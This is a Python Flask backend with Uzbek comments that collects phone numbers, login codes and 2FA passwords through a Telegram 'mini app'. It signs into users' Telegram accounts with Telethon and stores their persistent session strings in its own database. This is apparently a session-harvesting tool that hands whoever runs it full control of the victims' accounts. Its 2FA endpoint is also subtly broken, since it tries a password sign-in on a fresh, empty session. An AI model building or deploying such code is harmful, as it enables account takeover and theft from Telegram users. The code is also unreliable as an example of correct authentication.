# login_api.py
import os
import asyncio
import time
from flask import Flask, request, jsonify, render_template

from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession

from database import (
    get_db,
    save_session,
    save_login_code,
    get_login_code,
    delete_login_code
)

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

app = Flask(__name__)

# =========================
# SEND CODE
# =========================
@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        await client.disconnect()
        return result.phone_code_hash

    try:
        phone_code_hash = asyncio.run(_send())

        # 🔥 MAJBURIY — HASH NI DB GA SAQLAYMIZ
        save_login_code(phone, phone_code_hash)

        return jsonify({"status": "ok"})

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": "Kod yuborilmadi, qayta urinib ko‘ring"
        })


# =========================
# VERIFY CODE
# =========================
@app.route("/verify_code", methods=["POST"])
def verify_code():
    phone = request.json.get("phone")
    code = request.json.get("code")

    phone_code_hash = get_login_code(phone)
    if not phone_code_hash:
        return jsonify({
            "status": "error",
            "message": "Kod eskirgan, qayta yuboring"
        })

    async def _verify():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        try:
            await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
        except SessionPasswordNeededError:
            await client.disconnect()
            return "2fa"

        me = await client.get_me()
        session_str = client.session.save()

        await client.disconnect()
        return me, session_str

    try:
        result = asyncio.run(_verify())

        if result == "2fa":
            return jsonify({"status": "2fa_required"})

        me, session_str = result

        # 🔥 DOIMIY SESSION
        save_session(me.id, session_str)

        # 🔥 KODNI O‘CHIRAMIZ
        delete_login_code(phone)

        # userni ro‘yxatga olamiz
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO authorized_users (user_id, phone, username)
            VALUES (%s, %s, %s)
            ON CONFLICT (user_id) DO NOTHING
        """, (me.id, phone, me.username))
        conn.commit()
        conn.close()

        return jsonify({"status": "ok"})

    except Exception:
        return jsonify({
            "status": "error",
            "message": "Kod noto‘g‘ri"
        })


# =========================
# VERIFY PASSWORD (2FA)
# =========================
@app.route("/verify_password", methods=["POST"])
def verify_password():
    password = request.json.get("password")

    async def _verify():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(password=password)

        me = await client.get_me()
        session_str = client.session.save()

        await client.disconnect()
        return me, session_str

    try:
        me, session_str = asyncio.run(_verify())
        save_session(me.id, session_str)
        return jsonify({"status": "ok"})
    except Exception:
        return jsonify({"status": "error", "message": "Parol noto‘g‘ri"})


@app.route("/miniapp")
def miniapp():
    return render_template("login.html")
